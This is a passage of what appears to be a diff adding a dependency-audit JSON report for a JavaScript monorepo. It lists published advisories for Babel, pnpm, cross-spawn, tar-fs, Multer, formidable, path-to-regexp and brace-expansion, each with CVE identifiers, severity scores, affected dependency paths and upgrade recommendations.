groups](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions/Named_capturing_group), and target any browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10\n\nYou can verify what transforms `@babel/preset-env` is using by enabling the [`debug` option](https://babeljs.io/docs/babel-preset-env#debug).\n\n\n### Patches\n\nThis problem has been fixed in `@babel/helpers` and `@babel/runtime` 7.26.10 and 8.0.0-alpha.17, please upgrade. It's likely that you do not directly depend on `@babel/helpers`, and instead you depend on `@babel/core` (which itself depends on `@babel/helpers`). Upgrading to `@babel/core` 7.26.10 is not required, but it guarantees that you are on a new enough `@babel/helpers` version.\n\nPlease note that just updating your Babel dependencies is not enough: you will also need to re-compile your code.\n\n### Workarounds\n\nIf you are passing user-provided strings as the second argument of `.replace` on regular expressions that contain named capturing groups, validate the input and make sure it does not contain the substring `$<` if it's then not followed by `>` (possibly with other characters in between).\n\n### References\n\nThis vulnerability was reported and fixed in https://github.com/babel/babel/pull/17173.",
+      "reported_by": null,
+      "title": "Babel has inefficient RegExp complexity in generated code with .replace when transpiling named capturing groups",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-27789"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "@babel/runtime",
+      "vulnerable_versions": "<7.26.10",
+      "github_advisory_id": "GHSA-968p-4wvh-cqc8",
+      "recommendation": "Upgrade to version 7.26.10 or later",
+      "patched_versions": ">=7.26.10",
+      "updated": "2025-04-16T15:39:52.000Z",
+      "cvss": {
+        "score": 6.2,
+        "vectorString": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-1333"
+      ],
+      "url": "https://github.com/advisories/GHSA-968p-4wvh-cqc8"
+    },
+    "1104001": {
+      "findings": [
+        {
+          "version": "7.25.0",
+          "paths": [
+            "packages__lone-star-platform>jest>@jest/core>@jest/reporters>istanbul-lib-instrument>@babel/core>@babel/helpers"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/babel/babel/security/advisories/GHSA-968p-4wvh-cqc8\n- https://github.com/babel/babel/pull/17173\n- https://github.com/babel/babel/commit/d5952e80c0faa5ec20e35085531b6e572d31dad4\n- https://nvd.nist.gov/vuln/detail/CVE-2025-27789\n- https://github.com/advisories/GHSA-968p-4wvh-cqc8",
+      "created": "2025-03-11T20:30:18.000Z",
+      "id": 1104001,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nWhen using Babel to compile [regular expression named capturing groups](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions/Named_capturing_group), Babel will generate a polyfill for the `.replace` method that has quadratic complexity on some specific replacement pattern strings (i.e. the second argument passed to `.replace`).\n\nYour generated code is vulnerable if _all_ the following conditions are true:\n- You use Babel to compile [regular expression named capturing groups](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions/Named_capturing_group)\n- You use the `.replace` method on a regular expression that contains named capturing groups\n- **Your code uses untrusted strings as the second argument of `.replace`**\n\nIf you are using `@babel/preset-env` with the [`targets`](https://babeljs.io/docs/options#targets) option, the transform that injects the vulnerable code is automatically enabled if:\n- you use [_duplicated_ named capturing groups](https://github.com/tc39/proposal-duplicate-named-capturing-groups), and target any browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23\n- you use any [named capturing groups](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions/Named_capturing_group), and target any browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10\n\nYou can verify what transforms `@babel/preset-env` is using by enabling the [`debug` option](https://babeljs.io/docs/babel-preset-env#debug).\n\n\n### Patches\n\nThis problem has been fixed in `@babel/helpers` and `@babel/runtime` 7.26.10 and 8.0.0-alpha.17, please upgrade. It's likely that you do not directly depend on `@babel/helpers`, and instead you depend on `@babel/core` (which itself depends on `@babel/helpers`). Upgrading to `@babel/core` 7.26.10 is not required, but it guarantees that you are on a new enough `@babel/helpers` version.\n\nPlease note that just updating your Babel dependencies is not enough: you will also need to re-compile your code.\n\n### Workarounds\n\nIf you are passing user-provided strings as the second argument of `.replace` on regular expressions that contain named capturing groups, validate the input and make sure it does not contain the substring `$<` if it's then not followed by `>` (possibly with other characters in between).\n\n### References\n\nThis vulnerability was reported and fixed in https://github.com/babel/babel/pull/17173.",
+      "reported_by": null,
+      "title": "Babel has inefficient RegExp complexity in generated code with .replace when transpiling named capturing groups",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-27789"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "@babel/helpers",
+      "vulnerable_versions": "<7.26.10",
+      "github_advisory_id": "GHSA-968p-4wvh-cqc8",
+      "recommendation": "Upgrade to version 7.26.10 or later",
+      "patched_versions": ">=7.26.10",
+      "updated": "2025-04-16T15:39:52.000Z",
+      "cvss": {
+        "score": 6.2,
+        "vectorString": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-1333"
+      ],
+      "url": "https://github.com/advisories/GHSA-968p-4wvh-cqc8"
+    },
+    "1104027": {
+      "findings": [
+        {
+          "version": "9.9.0",
+          "paths": [
+            ".>pnpm"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/pnpm/pnpm/security/advisories/GHSA-8cc4-rfj6-fhg4\n- https://nvd.nist.gov/vuln/detail/CVE-2024-47829\n- https://github.com/advisories/GHSA-8cc4-rfj6-fhg4",
+      "created": "2025-04-23T14:05:47.000Z",
+      "id": 1104027,
+      "npm_advisory_id": null,
+      "overview": "The path shortening function is used in pnpm：\n```\nexport function depPathToFilename (depPath: string, maxLengthWithoutHash: number): string {\n  let filename = depPathToFilenameUnescaped(depPath).replace(/[\\\\/:*?\"<>|]/g, '+')\n  if (filename.includes('(')) {\n    filename = filename\n      .replace(/\\)$/, '')\n      .replace(/(\\)\\()|\\(|\\)/g, '_')\n  }\n  if (filename.length > maxLengthWithoutHash || filename !== filename.toLowerCase() && !filename.startsWith('file+')) {\n    return `${filename.substring(0, maxLengthWithoutHash - 27)}_${createBase32Hash(filename)}`\n  }\n  return filename\n}\n```\nHowever, it uses the md5 function as a path shortening compression function, and if a collision occurs, it will result in the same storage path for two different libraries. Although the real names are under the package name /node_modoules/, there are no version numbers for the libraries they refer to.\n![Schematic picture](https://github.com/user-attachments/assets/7b8b87ab-f297-47bd-a9dd-43be86e36ed2)\nIn the diagram, we assume that two packages are called packageA and packageB, and that the first 90 digits of their package names must be the same, and that the hash value of the package names with versions must be the same.  Then C is the package that they both reference, but with a different version number.  (npm allows package names up to 214 bytes, so constructing such a collision package name is obvious.)\n\nThen hash(packageA@1.2.3)=hash(packageB@3.4.5).  This results in the same path for the installation, and thus under the same directory.  Although the package names under node_modoules are the full paths again, they are shared with C.\nWhat is the exact version number of C?\nIn our local tests, it depends on which one is installed later.  If packageB is installed later, the C version number will change to 2.0.0.  At this time, although package A requires the C@1.0.0 version, package. json will only work during installation, and will not affect the actual operation.\nWe did not receive any installation error issues from pnpm during our local testing, nor did we use force, which is clearly a case that can be triggered.\n\nFor a package with a package name + version number longer than 120, another package can be constructed to introduce an indirect reference to a lower version, such as one with some known vulnerability.\nAlternatively, it is possible to construct two packages with more than 120 package names + version numbers.\nThis is clearly an advantage for those intent on carrying out supply chain attacks.\n\n\nThe solution:\nThe repair cost is also very low, just need to upgrade the md5 function to sha256.",
+      "reported_by": null,
+      "title": "pnpm uses the md5 path shortening function causes packet paths to coincide, which causes indirect packet overwriting",
+      "metadata": null,
+      "cves": [
+        "CVE-2024-47829"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "pnpm",
+      "vulnerable_versions": "<10.0.0",
+      "github_advisory_id": "GHSA-8cc4-rfj6-fhg4",
+      "recommendation": "Upgrade to version 10.0.0 or later",
+      "patched_versions": ">=10.0.0",
+      "updated": "2025-04-23T19:16:02.000Z",
+      "cvss": {
+        "score": 6.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:L/I:L/A:L"
+      },
+      "cwe": [
+        "CWE-328"
+      ],
+      "url": "https://github.com/advisories/GHSA-8cc4-rfj6-fhg4"
+    },
+    "1104663": {
+      "findings": [
+        {
+          "version": "6.0.5",
+          "paths": [
+            "packages__plugins-mock-atlas>webpack-spawn-plugin>cross-spawn"
+          ]
+        },
+        {
+          "version": "5.1.0",
+          "paths": [
+            "packages__plugins-mock-atlas>webpack-spawn-plugin>fkill>pid-from-port>execa>cross-spawn"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2024-21538\n- https://github.com/moxystudio/node-cross-spawn/pull/160\n- https://github.com/moxystudio/node-cross-spawn/commit/5ff3a07d9add449021d806e45c4168203aa833ff\n- https://github.com/moxystudio/node-cross-spawn/commit/640d391fde65388548601d95abedccc12943374f\n- https://security.snyk.io/vuln/SNYK-JS-CROSSSPAWN-8303230\n- https://github.com/moxystudio/node-cross-spawn/issues/165\n- https://github.com/moxystudio/node-cross-spawn/commit/d35c865b877d2f9ded7c1ed87521c2fdb689c8dd\n- https://security.snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-8366349\n- https://github.com/advisories/GHSA-3xgq-45jj-v275",
+      "created": "2024-11-08T06:30:47.000Z",
+      "id": 1104663,
+      "npm_advisory_id": null,
+      "overview": "Versions of the package cross-spawn before 7.0.5 are vulnerable to Regular Expression Denial of Service (ReDoS) due to improper input sanitization. An attacker can increase the CPU usage and crash the program by crafting a very large and well crafted string.",
+      "reported_by": null,
+      "title": "Regular Expression Denial of Service (ReDoS) in cross-spawn",
+      "metadata": null,
+      "cves": [
+        "CVE-2024-21538"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "cross-spawn",
+      "vulnerable_versions": "<6.0.6",
+      "github_advisory_id": "GHSA-3xgq-45jj-v275",
+      "recommendation": "Upgrade to version 6.0.6 or later",
+      "patched_versions": ">=6.0.6",
+      "updated": "2025-05-19T19:56:26.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-1333"
+      ],
+      "url": "https://github.com/advisories/GHSA-3xgq-45jj-v275"
+    },
+    "1104664": {
+      "findings": [
+        {
+          "version": "7.0.3",
+          "paths": [
+            "packages__base-game-lib>eslint>cross-spawn"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2024-21538\n- https://github.com/moxystudio/node-cross-spawn/pull/160\n- https://github.com/moxystudio/node-cross-spawn/commit/5ff3a07d9add449021d806e45c4168203aa833ff\n- https://github.com/moxystudio/node-cross-spawn/commit/640d391fde65388548601d95abedccc12943374f\n- https://security.snyk.io/vuln/SNYK-JS-CROSSSPAWN-8303230\n- https://github.com/moxystudio/node-cross-spawn/issues/165\n- https://github.com/moxystudio/node-cross-spawn/commit/d35c865b877d2f9ded7c1ed87521c2fdb689c8dd\n- https://security.snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-8366349\n- https://github.com/advisories/GHSA-3xgq-45jj-v275",
+      "created": "2024-11-08T06:30:47.000Z",
+      "id": 1104664,
+      "npm_advisory_id": null,
+      "overview": "Versions of the package cross-spawn before 7.0.5 are vulnerable to Regular Expression Denial of Service (ReDoS) due to improper input sanitization. An attacker can increase the CPU usage and crash the program by crafting a very large and well crafted string.",
+      "reported_by": null,
+      "title": "Regular Expression Denial of Service (ReDoS) in cross-spawn",
+      "metadata": null,
+      "cves": [
+        "CVE-2024-21538"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "cross-spawn",
+      "vulnerable_versions": ">=7.0.0 <7.0.5",
+      "github_advisory_id": "GHSA-3xgq-45jj-v275",
+      "recommendation": "Upgrade to version 7.0.5 or later",
+      "patched_versions": ">=7.0.5",
+      "updated": "2025-05-19T19:56:26.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-1333"
+      ],
+      "url": "https://github.com/advisories/GHSA-3xgq-45jj-v275"
+    },
+    "1104677": {
+      "findings": [
+        {
+          "version": "2.1.1",
+          "paths": [
+            "packages__lone-star-platform>@newrelic/native-metrics>prebuildify>tar-fs"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2024-12905\n- https://github.com/mafintosh/tar-fs/commit/a1dd7e7c7f4b4a8bd2ab60f513baca573b44e2ed\n- https://github.com/advisories/GHSA-pq67-2wwv-3xjx",
+      "created": "2025-03-27T18:31:28.000Z",
+      "id": 1104677,
+      "npm_advisory_id": null,
+      "overview": "An Improper Link Resolution Before File Access (\"Link Following\") and Improper Limitation of a Pathname to a Restricted Directory (\"Path Traversal\"). This vulnerability occurs when extracting a maliciously crafted tar file, which can result in unauthorized file writes or overwrites outside the intended extraction directory. The issue is associated with index.js in the tar-fs package.\n\nThis issue affects tar-fs: from 0.0.0 before 1.16.4, from 2.0.0 before 2.1.2, from 3.0.0 before 3.0.7.",
+      "reported_by": null,
+      "title": "tar-fs Vulnerable to Link Following and Path Traversal via Extracting a Crafted tar File",
+      "metadata": null,
+      "cves": [
+        "CVE-2024-12905"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "tar-fs",
+      "vulnerable_versions": ">=2.0.0 <2.1.2",
+      "github_advisory_id": "GHSA-pq67-2wwv-3xjx",
+      "recommendation": "Upgrade to version 2.1.2 or later",
+      "patched_versions": ">=2.1.2",
+      "updated": "2025-05-20T17:57:27.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"
+      },
+      "cwe": [
+        "CWE-22"
+      ],
+      "url": "https://github.com/advisories/GHSA-pq67-2wwv-3xjx"
+    },
+    "1104780": {
+      "findings": [
+        {
+          "version": "1.4.4-lts.1",
+          "paths": [
+            "packages__lone-star-platform>@aristocrattechnologiesinc/meta-service>@nestjs/platform-express>multer"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/expressjs/multer/security/advisories/GHSA-4pg4-qvpc-4q3h\n- https://nvd.nist.gov/vuln/detail/CVE-2025-47944\n- https://github.com/expressjs/multer/issues/1176\n- https://github.com/expressjs/multer/commit/2c8505f207d923dd8de13a9f93a4563e59933665\n- https://github.com/advisories/GHSA-4pg4-qvpc-4q3h",
+      "created": "2025-05-19T22:16:30.000Z",
+      "id": 1104780,
+      "npm_advisory_id": null,
+      "overview": "### Impact\nA vulnerability in Multer versions >=1.4.4-lts.1 allows an attacker to trigger a Denial of Service (DoS) by sending a malformed multi-part upload request. This request causes an unhandled exception, leading to a crash of the process.\n\n### Patches\nUsers should upgrade to `2.0.0`\n\n### Workarounds\nNone\n\n### References\n\n- https://github.com/expressjs/multer/issues/1176\n- https://github.com/expressjs/multer/commit/2c8505f207d923dd8de13a9f93a4563e59933665",
+      "reported_by": null,
+      "title": "Multer vulnerable to Denial of Service from maliciously crafted requests",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-47944"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "multer",
+      "vulnerable_versions": ">=1.4.4-lts.1 <2.0.0",
+      "github_advisory_id": "GHSA-4pg4-qvpc-4q3h",
+      "recommendation": "Upgrade to version 2.0.0 or later",
+      "patched_versions": ">=2.0.0",
+      "updated": "2025-05-21T20:37:35.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-248"
+      ],
+      "url": "https://github.com/advisories/GHSA-4pg4-qvpc-4q3h"
+    },
+    "1105075": {
+      "findings": [
+        {
+          "version": "3.5.1",
+          "paths": [
+            "packages__lone-star-platform>@aristocrattechnologiesinc/meta-service>superagent>formidable"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2025-46653\n- https://github.com/node-formidable/formidable/commit/022c2c5577dfe14d2947f10909d81b03b6070bf5\n- https://github.com/node-formidable/formidable/blob/d0fbec13edc8add54a1afb9ce1a8d3db803f8d47/CHANGELOG.md?plain=1#L10\n- https://github.com/zast-ai/vulnerability-reports/blob/main/formidable/file_upload/report.md\n- https://github.com/node-formidable/formidable/commit/37a3e89fca1ed68ec674a539f13aafd62221ddaa\n- https://www.npmjs.com/package/formidable/v/2.1.3\n- https://www.npmjs.com/package/formidable/v/3.5.3\n- https://github.com/advisories/GHSA-75v8-2h7p-7m2m",
+      "created": "2025-04-26T21:31:26.000Z",
+      "id": 1105075,
+      "npm_advisory_id": null,
+      "overview": "Formidable (aka node-formidable) 2.x before 2.1.3 and 3.x before 3.5.3 relies on hexoid to prevent guessing of filenames for untrusted executable content; however, hexoid is documented as not \"cryptographically secure.\" (Also, there is a scenario in which only the last two characters of a hexoid string need to be guessed, but this is not often relevant.) NOTE: this does not imply that, in a typical use case, attackers will be able to exploit any hexoid behavior to upload and execute their own content.",
+      "reported_by": null,
+      "title": "Formidable relies on hexoid to prevent guessing of filenames for untrusted executable content",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-46653"
+      ],
+      "access": "public",
+      "severity": "low",
+      "module_name": "formidable",
+      "vulnerable_versions": ">=3.1.1-canary.20211030 <3.5.3",
+      "github_advisory_id": "GHSA-75v8-2h7p-7m2m",
+      "recommendation": "Upgrade to version 3.5.3 or later",
+      "patched_versions": ">=3.5.3",
+      "updated": "2025-05-27T18:49:22.000Z",
+      "cvss": {
+        "score": 3.1,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-338"
+      ],
+      "url": "https://github.com/advisories/GHSA-75v8-2h7p-7m2m"
+    },
+    "1105199": {
+      "findings": [
+        {
+          "version": "0.1.7",
+          "paths": [
+            "packages__lone-star-platform>@aristocrattechnologiesinc/meta-service>@nestjs/platform-express>express>path-to-regexp"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/pillarjs/path-to-regexp/security/advisories/GHSA-rhx6-c78j-4q9w\n- https://blakeembrey.com/posts/2024-09-web-redos\n- https://nvd.nist.gov/vuln/detail/CVE-2024-52798\n- https://github.com/pillarjs/path-to-regexp/commit/f01c26a013b1889f0c217c643964513acf17f6a4\n- https://security.netapp.com/advisory/ntap-20250124-0002\n- https://github.com/advisories/GHSA-rhx6-c78j-4q9w",
+      "created": "2024-12-05T22:40:47.000Z",
+      "id": 1105199,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nThe regular expression that is vulnerable to backtracking can be generated in versions before 0.1.12 of `path-to-regexp`, originally reported in CVE-2024-45296\n\n### Patches\n\nUpgrade to 0.1.12.\n\n### Workarounds\n\nAvoid using two parameters within a single path segment, when the separator is not `.` (e.g. no `/:a-:b`). Alternatively, you can define the regex used for both parameters and ensure they do not overlap to allow backtracking.\n\n### References\n\n- https://github.com/advisories/GHSA-9wv6-86v2-598j\n- https://blakeembrey.com/posts/2024-09-web-redos/",
+      "reported_by": null,
+      "title": "path-to-regexp contains a ReDoS",
+      "metadata": null,
+      "cves": [
+        "CVE-2024-52798"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "path-to-regexp",
+      "vulnerable_versions": "<0.1.12",
+      "github_advisory_id": "GHSA-rhx6-c78j-4q9w",
+      "recommendation": "Upgrade to version 0.1.12 or later",
+      "patched_versions": ">=0.1.12",
+      "updated": "2025-06-03T14:30:57.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-1333"
+      ],
+      "url": "https://github.com/advisories/GHSA-rhx6-c78j-4q9w"
+    },
+    "1105262": {
+      "findings": [
+        {
+          "version": "1.4.4-lts.1",
+          "paths": [
+            "packages__lone-star-platform>@aristocrattechnologiesinc/meta-service>@nestjs/platform-express>multer"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/expressjs/multer/security/advisories/GHSA-g5hg-p3ph-g8qg\n- https://nvd.nist.gov/vuln/detail/CVE-2025-48997\n- https://github.com/expressjs/multer/issues/1233\n- https://github.com/expressjs/multer/pull/1256\n- https://github.com/expressjs/multer/commit/35a3272b611945155e046dd5cef11088587635e9\n- https://github.com/advisories/GHSA-g5hg-p3ph-g8qg",
+      "created": "2025-06-05T01:09:35.000Z",
+      "id": 1105262,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nA vulnerability in Multer versions >=1.4.4-lts.1, <2.0.1 allows an attacker to trigger a Denial of Service (DoS) by sending an upload file request with an empty string field name. This request causes an unhandled exception, leading to a crash of the process.\n\n### Patches\n\nUsers should upgrade to `2.0.1`\n\n### Workarounds\n\nNone\n\n### References\n\nhttps://github.com/expressjs/multer/commit/35a3272b611945155e046dd5cef11088587635e9\nhttps://github.com/expressjs/multer/issues/1233\nhttps://github.com/expressjs/multer/pull/1256",
+      "reported_by": null,
+      "title": "Multer vulnerable to Denial of Service via unhandled exception",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-48997"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "multer",
+      "vulnerable_versions": ">=1.4.4-lts.1 <2.0.1",
+      "github_advisory_id": "GHSA-g5hg-p3ph-g8qg",
+      "recommendation": "Upgrade to version 2.0.1 or later",
+      "patched_versions": ">=2.0.1",
+      "updated": "2025-06-05T01:09:36.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-248"
+      ],
+      "url": "https://github.com/advisories/GHSA-g5hg-p3ph-g8qg"
+    },
+    "1105443": {
+      "findings": [
+        {
+          "version": "1.1.11",
+          "paths": [
+            ".>@aristocrattechnologiesinc/random-number>grpc-tools>@mapbox/node-pre-gyp>rimraf>glob>minimatch>brace-expansion"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2025-5889\n- https://github.com/juliangruber/brace-expansion/pull/65/commits/a5b98a4f30d7813266b221435e1eaaf25a1b0ac5\n- https://gist.github.com/mmmsssttt404/37a40ce7d6e5ca604858fe30814d9466\n- https://vuldb.com/?ctiid.311660\n- https://vuldb.com/?id.311660\n- https://vuldb.com/?submit.585717\n- https://github.com/juliangruber/brace-expansion/commit/0b6a9781e18e9d2769bb2931f4856d1360243ed2\n- https://github.com/juliangruber/brace-expansion/commit/15f9b3c75ebf5988198241fecaebdc45eff28a9f\n- https://github.com/juliangruber/brace-expansion/commit/36603d5f3599a37af9e85eda30acd7d28599c36e\n- https://github.com/juliangruber/brace-expansion/commit/c3c73c8b088defc70851843be88ccc3af08e7217\n- https://github.com/advisories/GHSA-v6h2-p8h4-qcjw",
+      "created": "2025-06-09T21:30:51.000Z",
+      "id": 1105443,
+      "npm_advisory_id": null,
+      "overview": "A vulnerability was found in juliangruber brace-expansion up to 1.1.11/2.0.1/3.0.0/4.0.0. It has been rated as problematic. Affected by this issue is the function expand of the file index.js. The manipulation leads to inefficient regular expression complexity. The attack may be launched remotely. The complexity of an attack is rather high. The exploitation is known to be difficult. The exploit has been disclosed to the public and may be used. Upgrading to version 1.1.12, 2.0.2, 3.0.1 and 4.0.1 is able to address this issue. The name of the patch is `a5b98a4f30d7813266b221435e1eaaf25a1b0ac5`. It is recommended to upgrade the affected component.",
+      "reported_by": null,
+      "title": "brace-expansion Regular Expression Denial of Service vulnerability",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-5889"
+      ],
+      "access": "public",
+      "severity": "low",
+      "module_name": "brace-expansion",
+      "vulnerable_versions": ">=1.0.0 <=1.1.11",
+      "github_advisory_id": "GHSA-v6h2-p8h4-qcjw",
+      "recommendation": "Upgrade to version 1.1.12 or later",
+      "patched_versions": ">=1.1.12",
+      "updated": "2025-06-11T21:00:29.000Z",
+      "cvss": {
+        "score": 3.1,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:N/A:L"
+      },
+      "cwe": [
+        "CWE-400"
+      ],
+      "url": "https://github.com/advisories/GHSA-v6h2-p8h4-qcjw"
+    },
+    "1105444": {
+      "findings": [
+        {
+          "version": "2.0.1",
+          "paths": [
+            "packages__lone-star-platform>ts-jest>ejs>jake>filelist>minimatch>brace-expansion"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2025-5889\n- https://github.com/juliangruber/brace-expansion/pull/65/commits/a5b98a4f30d7813266b221435e1eaaf25a1b0ac5\n- https://gist.github.com/mmmsssttt404/37a40ce7d6e5ca604858fe30814d9466\n- https://vuldb.com/?ctiid.311660\n- https://vuldb.com/?id.311660\n- https://vuldb.com/?submit.585717\n- https://github.com/juliangruber/brace-expansion/commit/0b6a9781e18e9d2769bb2931f4856d1360243ed2\n- https://github.com/juliangruber/brace-expansion/commit/15f9b3c75ebf5988198241fecaebdc45eff28a9f\n- https://github.com/juliangruber/brace-expansion/commit/36603d5f3599a37af9e85eda30acd7d28599c36e\n- https://github.com/juliangruber/brace-expansion/commit/c3c73c8b088defc70851843be88ccc3af08e7217\n- https://github.com/advisories/GHSA-v6h2-p8h4-qcjw",
+      "created": "2025-06-09T21:30:51.000Z",
+      "id": 1105444,
+      "npm_advisory_id": null,
+      "overview": "A vulnerability was found in juliangruber brace-expansion up to 1.1.11/2.0.1/3.0.0/4.0.0. It has been rated as problematic. Affected by this issue is the function expand of the file index.js. The manipulation leads to inefficient regular expression complexity. The attack may be launched remotely. The complexity of an attack is rather high. The exploitation is known to be difficult. The exploit has been disclosed to the public and may be used. Upgrading to version 1.1.12, 2.0.2, 3.0.1 and 4.0.1 is able to address this issue. The name of the patch is `a5b98a4f30d7813266b221435e1eaaf25a1b0ac5`. It is recommended to upgrade the affected component.",
+      "reported_by": null,
+      "title": "brace-expansion Regular Expression Denial of Service vulnerability",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-5889"
+      ],
+      "access": "public",
+      "severity": "low",
+      "module_name": "brace-expansion",
+      "vulnerable_versions": ">=2.0.0 <=2.0.1",
+      "github_advisory_id": "GHSA-v6h2-p8h4-qcjw",
+      "recommendation": "Upgrade to version 2.0.2 or later",
+      "patched_versions": ">=2.0.2",
+      "updated": "2025-06-11T21:00:29.000Z",
+      "cvss": {
+        "score": 3.1,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:N/A:L"
+      },
+      "cwe": [
+        "CWE-400"
+      ],
+      "url": "https://github.com/advisories/GHSA-v6h2-p8h4-qcjw"
+    },
+    "1106463": {
+      "findings": [
+        {
+          "version": "1.4.4-lts.1",
+          "paths": [
+            "packages__lone-star-platform>@aristocrattechnologiesinc/meta-service>@nestjs/platform-express>multer"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/expressjs/multer/security/advisories/GHSA-fjgf-rc76-4x9p\n- https://nvd.nist.gov/vuln/detail/CVE-2025-7338\n- https://github.com/expressjs/multer/commit/adfeaf669f0e7fe953eab191a762164a452d143b\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/advisories/GHSA-fjgf-rc76-4x9p",
+      "created": "2025-07-17T21:01:54.000Z",
+      "id": 1106463,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nA vulnerability in Multer versions >= 1.4.4-lts.1, < 2.0.2 allows an attacker to trigger a Denial of Service (DoS) by sending a malformed request. This request causes an unhandled exception, leading to a crash of the process.\n\n### Patches\n\nUsers should upgrade to `2.0.2`\n\n### Workarounds\n\nNone",
+      "reported_by": null,
+      "title": "Multer vulnerable to Denial of Service via unhandled exception from malformed request",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-7338"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "multer",
+      "vulnerable_versions": ">=1.4.4-lts.1 <2.0.2",
+      "github_advisory_id": "GHSA-fjgf-rc76-4x9p",
+      "recommendation": "Upgrade to version 2.0.2 or later",
+      "patched_versions": ">=2.0.2",
+      "updated": "2025-07-17T21:01:55.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-248"
+      ],
+      "url": "https://github.com/advisories/GHSA-fjgf-rc76-4x9p"
+    },
+    "1106507": {
+      "findings": [
+        {
+          "version": "4.0.0",
+          "paths": [
+            "packages__clients__atlas>@types/node-fetch>form-data"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/form-data/form-data/security/advisories/GHSA-fjxv-7rqg-78g4\n- https://nvd.nist.gov/vuln/detail/CVE-2025-7783\n- https://github.com/form-data/form-data/commit/3d1723080e6577a66f17f163ecd345a21d8d0fd0\n- https://github.com/benweissmann/CVE-2025-7783-poc\n- https://github.com/advisories/GHSA-fjxv-7rqg-78g4",
+      "created": "2025-07-21T19:04:54.000Z",
+      "id": 1106507,
+      "npm_advisory_id": null,
